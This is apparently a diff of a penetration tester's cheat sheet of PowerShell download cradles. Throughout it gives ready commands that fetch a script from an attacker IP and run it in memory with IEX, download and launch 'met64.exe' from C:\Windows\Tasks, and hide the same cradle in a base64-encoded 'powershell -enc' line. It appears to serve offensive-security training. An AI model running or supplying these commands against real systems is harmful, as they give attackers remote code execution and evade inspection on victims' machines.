@@ -4,16 +4,23 @@
 ### Powershell
 #ps1 #runner #cradle
 Download cradle in memory:
-``` ps1
-(New-Object System.Net.WebClient).DownloadString("http://192.168.49.155/simple-runner.ps1") | IEX
+```powershell
+(New-Object System.Net.WebClient).DownloadString("http://192.168.49.155/run.txt") | IEX
 ```
 
-#ps1 #encoding
+#ps1 #runner #cradle #dropper #exe
+```powershell
+powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.186/met64.exe', 'C:\Windows\Tasks\met64.exe'); C:\Windows\Tasks\met64.exe
+```
+
+
+#ps1 #encoding #cradle
 Encode download cradle:
-``` ps1
+```powershell
 $text = "<download cradle>"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
 $EncodedText = [Convert]::ToBase64String($bytes)
 $EncodedText
 # then to execute use powershell -enc <encoded_text>
+powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADEANQA1AC8AcgB1AG4ALgB0AHgAdAAiACkAIAB8ACAASQBFAFgA
 ```
